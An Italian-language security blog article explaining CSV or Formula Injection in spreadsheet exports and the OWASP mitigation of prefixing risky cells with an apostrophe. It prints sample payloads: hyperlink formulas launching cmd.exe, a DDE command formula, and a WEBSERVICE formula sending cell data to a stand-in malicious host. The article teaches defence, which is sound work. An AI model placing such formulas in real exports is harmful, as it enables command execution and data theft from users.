
**Comma Separated Victims (sottotitolo:  Attenti alla Formula!)**
*autore: Simone Cinti - Gennaio 2021*

Quante volte ti è capitato di aver a che fare con l'export dei dati in formato CSV?
Diverse volte, suppongo.
Sei consapevole dei rischi a cui potresti andare incontro sottovalutando alcune vulnerabilità nello sviluppo di una componente per l'export dei dati in formato CSV, che potrebbero consentire una serie di attacchi quali  **Remote Command Execution**  e **Data Breach**?
Se non hai mai sentito parlare di **Injection** e, più precisamente di **Formula Injection** o di **CSV Injection**,  allora questo articolo farà certamente al caso tuo.

Nel mio [precedente articolo](https://techblog.smc.it/it/2020-06-19/injection-attacks-how-to-prevent-with-liferay) su questo techblog avevo già illustrato come gli attacchi di tipo Injection possono rappresentare un serio rischio per la sicurezza dei tuoi dati, e come prevenirli con Liferay.
La lettura di questo articolo: [Injection attacks - how to prevent with Liferay](https://techblog.smc.it/it/2020-06-19/injection-attacks-how-to-prevent-with-liferay) è dunque vivamente consigliata al fine di comprendere al meglio gli argomenti trattati; tuttavia se sei un lettore esperto e già conosci le insidie che si nascondono dietro questo tipo di attacchi e le strategie per neutralizzarli, allora non avrai di certo difficoltà a proseguire con la lettura.

Come saprai, la prima regola per scongiurare gli attacchi di tipo Injection consiste nella validazione degli input: ciò consentirà di escludere alcuni caratteri più o meno speciali che potrebbero riverlarsi assai utili per l'attaccante.
Purtroppo però non sempre è facile definire una espressione regolare che consenta di filtrare in modo efficace i caratteri non desiderati dagli input, senza fare a meno di caratteri che invece appartengono propriamente al dominio dell'input e dei quali non possiamo farne a meno. Un esempio può essere il carattere apostrofo " ' " che non possiamo di certo escludere dai campi di input per il nome ed il cognome, ma del quale faremmo volentieri a meno in quanto lo stesso carattere è sia un valido separatore di attributi in HTML che un carattere indispensabile nel linguaggio SQL per definire sequenze di caratteri. Per questo motivo è sempre opportuno assicurarsi di non aver trascurato la seconda regola per la neutralizzazione degli attacchi di tipo **Injection**, che consiste nella sanitizzazione dell'output o **output escaping**. 
Nonostante tutte queste precauzioni potrebbe però accadere che, del tutto ignari dei rischi che potrebbero derivare dalla mancanza di escaping dei valori delle celle che si esportano, tutte queste attenzioni che abbiamo dato all'output sanitization in pagina vengono poi trascurate quando ci troviamo di fronte ad una componente di export CSV. 

*Niente di più pericoloso...*

Del resto anche nei nomi delle API che utilizziamo per effettuare l'escaping compaiono spesso i termini HTML e JS mentre difficilmente comparirà il termine CSV, e potrebbe anche essere questa la giustificazione di una nostra eventuale dimenticanza.

Per mostrarti in modo efficace il rischio che stai correndo, concentriamoci ora su uno dei campi di input più insidiosi da validare: il campo *note*. 
Spesso, per dare più libertà all'utente, oltre ai caratteri alfanumerici in un campo *note* multilinea sono consentiti i caratteri di punteggiatura ed alcuni simboli di valute oltre al simbolo "%" percentuale o altri caratteri speciali. 

Ma **nelle situazioni più comuni** non effettuiamo alcun tipo di validazione né di escaping dei valori delle celle esportate nel CSV, perché in genere **non sospettiamo affatto delle insidie che possono nascondersi dietro l'interpretazione di valori non desiderati in un foglio di calcolo**.

Nei fogli di calcolo più diffusi nelle Office suite, come LibreOffice Calc o Microsoft Excel, alcune funzioni del foglio di calcolo possono rivelarsi un serio problema dal punto di vista della sicurezza. 

In particolare, potremmo inserire nel campo note in input la sequenza:

    =COLLEG.IPERTESTUALE("C:\Windows\System32\cmd.exe";"Apri la pagina web")

per generare in output un CSV che nella cella corrispondente avrà un valore che se cliccato dall'utente consentirà l'esecuzione (previa conferma da parte dell'utente) del comando al percorso indicato. Nell'esempio aprirà il prompt dei comandi sulla macchina della vittima; in questo modo l'attaccante è riuscito a sfruttare un attacco **Formula Injection** al fine di ottenere poi l'esecuzione di un comando del Sistema Operativo (**Remote Command Execution** o più propriamente **OS Command Injection**)

Allarmante, vero?

Del resto potremmo ovviare semplicemente con l'aggiunta di qualche meccanismo di validazione, se non fosse per il fatto che, trattandosi di hyperlink, di certo il foglio di calcolo potrà interpretare correttamente anche la seguente stringa in formato URL encoded:

    =COLLEG.IPERTESTUALE("C%3A%5Cwindows%5Csystem32%5Ccmd.exe")
   
ecco dunque il motivo per il quale potrebbe risultare complicato proteggersi da un attacco di questo tipo nei casi in cui alcuni simboli come il percentuale, l'uguale o le parentesi tonde debbano essere accettati in input a meno di non voler limitare l'applicazione venendo meno alle necessità concordate con l'utente.

Per fortuna i fogli di calcolo che supportano questa tipologia di formule consentono la sola esecuzione del file indicato sul percorso e non il passaggio dei parametri, altrimenti potremmo effettuare lo **shutdown** immediato di un Sistema Operativo Windows iniettando il comando:

    C:\Windows\System32\cmd.exe /C "shutdown /p"

ma ciò è soltanto una magra consolazione, se pensiamo che invece è ammessa l'esecuzione di script in formato .vbs (VBScript).

Qualora la vittima utilizzasse invece versioni precedenti della suite Office oppure una versione recente in cui è abilitato il servizio [**Dynamic Data Exchange**](https://docs.microsoft.com/it-it/office/troubleshoot/excel/security-settings), allora potrebbe anche rischiare di subire un attacco ben più grave che consente l'esecuzione di comandi stavolta anche con il supporto dei parametri:

    =cmd|'/K echo INJECTION'!A0

Attacchi di questo tipo mediante **Formula Injection** sono dunque degli stratagemmi per arrivare ad altre tipologie di attacchi ben più pericolosi quali **l'esecuzione di un comando** del Sistema Operativo o di una applicazione in modo indesiderato.

Dal momento che si accennava agli hyperlink, un attaccante potrebbe sfruttare un attacco di questo tipo anche per l'invocazione di servizi web malevoli mediante la funzione per l'invocazione dei servizi web.
Ad esempio, un attaccante potrebbe sfruttare una tale vulnerabilità per iniettare una formula che consenta l'invocazione di un servizio web a sua scelta, al fine di ricevere i dati contenuti nelle altre celle. Tale formula potrà essere iniettata in un campo di input di un form, per essere poi salvata nel database applicativo.
In un secondo momento, un utente che richiederà l'export dei dati otterrà così il file CSV in cui il valore di una delle cella conterrà questa formula potenzialmente dannosa. L'utente che aprirà il file CSV, ignaro di tutto, potrebbe (involontariamente) invocare una HTTP Request verso il servizio malevolo:

    =SERVIZIO.WEB(CONCATENA("http://service.malware?d="; C6&","&C7&","&C8))

passando nei parametri in GET i dati contenuti in determinate celle, essendo così vittima di un attacco di tipo **Formula Injection** ai fini di un **Data Breach** (come avviene con il parametro "d" che nell'esempio contiene la concatenazione dei valori presenti nelle celle C6, C7 e C8).

Arrivati a questo punto ti starai chiedendo quali sono le strategie utili a neutralizzare questo tipo di attacchi.

In accordo con quanto [consigliato da **OWASP**](https://owasp.org/www-community/attacks/CSV_Injection) in merito alle strategie di difesa mediante neutralizzazione degli attacchi di tipo **CSV Injection** o **Formula Injection**, è sufficiente anteporre il carattere apostrofo " ' " ad ogni valore di cella che inizi per:

 - = (*uguale*)
 - \+  (*più*)
 - \-  (*meno*)
 - @  (*chiocciola*)
 
 in questo modo si eviterebbe al foglio di calcolo di interpretare come formula il valore contenuto nella cella, che mostrerà il valore come una semplice stringa.

Ovviamente ciò non ci renderà immuni da quell'utente che decida arbitrariamente di modificare il valore della cella eliminando il carattere apostrofo.
In tal caso potremmo adottare strategie più o meno restrittive o invasive di sanitizzazione al fine di proteggere anche gli utenti più *intraprendenti* da se stessi.

Per ulteriori approfondimenti:
- https://payatu.com/csv-injection-basic-to-exploit
- https://labs.bishopfox.com/tech-blog/2018/06/server-side-spreadsheet-injections
- https://owasp.org/www-community/attacks/CSV_Injection
- https://cwe.mitre.org/data/definitions/1236.html
- https://docs.microsoft.com/it-it/office/troubleshoot/excel/security-settings
- https://techblog.smc.it/it/2020-06-19/injection-attacks-how-to-prevent-with-liferay
 
